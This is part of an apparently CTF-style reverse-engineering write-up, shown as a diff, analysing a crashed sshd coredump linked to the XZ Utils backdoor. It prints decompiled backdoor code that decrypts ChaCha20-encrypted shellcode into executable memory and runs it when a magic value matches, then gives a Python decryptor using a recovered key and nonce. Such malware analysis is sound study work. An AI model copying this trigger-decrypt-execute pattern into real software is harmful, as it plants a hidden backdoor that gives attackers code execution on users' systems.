@@ -957,4 +957,131 @@ root@1729c7775492:/sbin# gdb sshd /var/lib/systemd/coredump/sshd.core.93794.0.0.
 ![image](https://github.com/user-attachments/assets/7b5ae448-215b-4a0a-980f-2f1c349ea87c)
 
 - It crashed in `liblzma.so.5`, which leads us to the infamous [CVE-2024-3094](https://en.wikipedia.org/wiki/XZ_Utils_backdoor)
-- 
+- According to [Wikipedia](https://en.wikipedia.org/wiki/XZ_Utils_backdoor#Mechanism), the compromised code is in `RSA_public_decrypt`
+```C
+__int64 __fastcall sub_9820(unsigned int a1, _DWORD *a2, __int64 a3, __int64 a4, unsigned int a5)
+{
+  const char *v9; // rsi
+  void *v10; // rax
+  void *v12; // rax
+  void (*v13)(void); // [rsp+8h] [rbp-120h]
+  char v14[200]; // [rsp+20h] [rbp-108h] BYREF
+  unsigned __int64 v15; // [rsp+E8h] [rbp-40h]
+
+  v15 = __readfsqword(0x28u);
+  v9 = "RSA_public_decrypt";
+  if ( !getuid() )
+  {
+    if ( *a2 == 0xC5407A48 )
+    {
+      chacha20_init(v14, a2 + 1, a2 + 9, 0LL);
+      v12 = mmap(0LL, size, 7, 0x22, 0xFFFFFFFF, 0LL);
+      v13 = (void (*)(void))memcpy(v12, &shellcode, size);
+      chacha20_encrypt_decrypt(v14, v13, size);
+      v13();
+      chacha20_init(v14, a2 + 1, a2 + 9, 0LL);
+      chacha20_encrypt_decrypt(v14, v13, size);
+    }
+    v9 = "RSA_public_decrypt ";
+  }
+  v10 = dlsym(0LL, v9);
+  return ((__int64 (__fastcall *)(_QWORD, _DWORD *, __int64, __int64, _QWORD))v10)(a1, a2, a3, a4, a5);
+}
+``` 
+- It use `ChaCha20` algorithm to decrypt the shellcode, then execute it. Now we will have to find key and nonce for `ChaCha20` to decrypt the shellcode. Luckily, we can trace back to the coredump file to find those. Since `ChaCha20` use the string `expand 32-byte k` as constant, we can just find that string in the hex editor
+
+![image](https://github.com/user-attachments/assets/d6dacadd-0d69-49a2-9829-fc6be14bca01)
+
+- Knowing that ChaCha20's state consist of a 32 bytes constant, 32 bytes key, 4 bytes counter and 12 bytes nonce we can a Python script to decrypt as following
+
+```python
+import struct
+
+# ChaCha20 quarter-round function
+def quarter_round(state, a, b, c, d):
+    state[a] = (state[a] + state[b]) & 0xFFFFFFFF
+    state[d] ^= state[a]
+    state[d] = ((state[d] << 16) | (state[d] >> 16)) & 0xFFFFFFFF
+
+    state[c] = (state[c] + state[d]) & 0xFFFFFFFF
+    state[b] ^= state[c]
+    state[b] = ((state[b] << 12) | (state[b] >> 20)) & 0xFFFFFFFF
+
+    state[a] = (state[a] + state[b]) & 0xFFFFFFFF
+    state[d] ^= state[a]
+    state[d] = ((state[d] << 8) | (state[d] >> 24)) & 0xFFFFFFFF
+
+    state[c] = (state[c] + state[d]) & 0xFFFFFFFF
+    state[b] ^= state[c]
+    state[b] = ((state[b] << 7) | (state[b] >> 25)) & 0xFFFFFFFF
+
+# ChaCha20 block function
+def chacha20_block(state):
+    # Copy the state
+    working_state = state[:]
+
+    # Perform 20 rounds (10 column rounds + 10 diagonal rounds)
+    for _ in range(10):
+        # Column rounds
+        quarter_round(working_state, 0, 4, 8, 12)
+        quarter_round(working_state, 1, 5, 9, 13)
+        quarter_round(working_state, 2, 6, 10, 14)
+        quarter_round(working_state, 3, 7, 11, 15)
+
+        # Diagonal rounds
+        quarter_round(working_state, 0, 5, 10, 15)
+        quarter_round(working_state, 1, 6, 11, 12)
+        quarter_round(working_state, 2, 7, 8, 13)
+        quarter_round(working_state, 3, 4, 9, 14)
+
+    # Add the original state to the working state
+    for i in range(16):
+        working_state[i] = (working_state[i] + state[i]) & 0xFFFFFFFF
+
+    # Serialize the state into bytes
+    return b''.join(struct.pack("<I", word) for word in working_state)
+
+# Custom state setup
+constants = struct.unpack("<4I", b"expand 32-byte k")  # Constants
+key = struct.unpack("<8I", bytes.fromhex(
+    "943DF638A81813E2DE6318A507F9A0BA"
+    "2DBB8A7BA63666D08D11A65EC914D66F"
+))  # Key
+nonce = struct.unpack("<3I", bytes.fromhex(
+    "F236839F4DCD711A52862955"
+))  # Nonce (split into 3 integers)
+counter = 0  # Custom counter(KCSC)
+
+# Initial state (combine constants, key, counter, and nonce)
+initial_state = list(constants) + list(key) + [counter] + list(nonce)
+
+# Decrypt ciphertext
+def chacha20_decrypt(custom_state, ciphertext):
+    plaintext = bytearray()
+    for i in range(0, len(ciphertext), 64):
+        # Generate block for current position
+        block = chacha20_block(custom_state)
+        custom_state[12] += 1  # Increment counter
+        chunk = ciphertext[i:i + 64]
+        plaintext.extend(a ^ b for a, b in zip(chunk, block))
+    return plaintext
+
+# Read ciphertext from file
+with open("D:\\KCSC RE\\sshd (1)\\encrypted_payload", "rb") as file:
+    ciphertext = file.read()
+
+# Decrypt
+plaintext = chacha20_decrypt(initial_state, ciphertext)
+
+# Write the decrypted plaintext to a file
+with open("D:\\KCSC RE\\sshd (1)\\decrypted_output.bin", "wb") as file:
+    file.write(plaintext)
+
+print("Decrypted text saved to 'decrypted_output.bin'")
+
+```
+- As expected, the result gave us a shellcode like program
+
+![image](https://github.com/user-attachments/assets/320e31ad-e57f-4531-b732-993c7329caac)
+![image](https://github.com/user-attachments/assets/5b4c0072-0ea3-48b7-8536-8c28bb9b4729)
+
